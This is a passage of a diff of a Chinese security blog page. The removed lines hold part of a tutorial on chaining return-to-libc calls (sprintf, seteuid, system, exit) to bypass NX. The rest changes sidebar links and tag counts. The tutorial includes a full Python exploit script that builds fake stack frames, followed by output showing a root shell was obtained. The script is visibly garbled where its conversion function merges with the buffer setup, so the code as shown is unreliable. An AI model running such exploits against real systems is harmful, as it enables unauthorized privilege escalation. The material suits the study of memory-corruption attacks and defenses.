-<p><u>问题2</u>: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。</p>
-<p><u>注意</u>: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。</p>
-<p>因此链接下面的libc函数可以解决上面提到的两个问题并成功获取root shell:</p>
-<pre><code>sprintf|sprintf|sprintf|sprintf|seteuid|system|exit
-</code></pre><p><u>漏洞利用代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fake_ebp0 = <span class="number">0xbffff1a0</span></div><div class="line">fake_ebp1 = <span class="number">0xbffff1b8</span></div><div class="line">fake_ebp2 = <span class="number">0xbffff1d0</span></div><div class="line">fake_ebp3 = <span class="number">0xbffff1e8</span></div><div class="line">fake_ebp4 = <span class="number">0xbffff204</span></div><div class="line">fake_ebp5 = <span class="number">0xbffff214</span></div><div class="line">fake_ebp6 = <span class="number">0xbffff224</span></div><div class="line">fake_ebp7 = <span class="number">0xbffff234</span></div><div class="line">leave_ret = <span class="number">0x0804851c</span></div><div class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span></div><div class="line">seteuid_addr = <span class="number">0xb7f09720</span></div><div class="line">system_addr = <span class="number">0xb7e61060</span></div><div class="line">exit_addr = <span class="number">0xb7e54be0</span></div><div class="line">sprintf_arg1 = <span class="number">0xbffff210</span></div><div class="line">sprintf_arg2 = <span class="number">0x80485f0</span></div><div class="line">sprintf_arg3 = <span class="number">0xbffff23c</span></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line">exit_arg = <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">264</span> </div><div class="line">buf += conv(fake_ebp0) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Below four <span class="built_in">stack</span> frames are <span class="keyword">for</span> <span class="built_in">sprintf</span> (to setup seteuid arg )</div><div class="line">buf += conv(fake_ebp1) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp2) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp3) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp4) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3)</div><div class="line">#Dummy - To avoid null byte in fake_ebp4. </div><div class="line">buf += <span class="string">"X"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> seteuid</div><div class="line">buf += conv(fake_ebp5) </div><div class="line">buf += conv(seteuid_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Dummy - This arg is zero'd by above four <span class="built_in">sprintf</span> calls</div><div class="line">buf += <span class="string">"Y"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> system</div><div class="line">buf += conv(fake_ebp6) </div><div class="line">buf += conv(system_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(system_arg) </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> <span class="built_in">exit</span></div><div class="line">buf += conv(fake_ebp7) </div><div class="line">buf += conv(exit_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(exit_arg) </div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
-<p>执行上面的漏洞利用代码就可以拿到root shell!!!</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����������������\��������������\��������������\�������������\��� �������AAAA0�������Ѕ</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p>现在已经成功绕过NX,<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">下一篇</a>文章让我们来看看如果绕过ASLR.</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -1153,6 +1260,18 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a></h6>
+              <span>一月 2, 2017</span>
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1262,18 +1381,6 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a></h6>
-              <span>一月 1, 2017</span>
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1284,7 +1391,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -1294,7 +1401,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QEMU/">QEMU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">5</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Libvmi/">Libvmi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QEMU/">QEMU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Volatility/">Volatility</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1304,7 +1411,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.14px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 14.29px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 11.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.43px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.43px;">Overflow</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.43px;">Stack</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15.71px;">Virtualization</a>
+      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.14px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 14.29px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 11.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.43px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 10px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.43px;">Overflow</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.43px;">Stack</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15.71px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
     </div>
   </div>
 
@@ -1314,7 +1421,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
     <h3 class="widget-title">归档</h3>
 
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
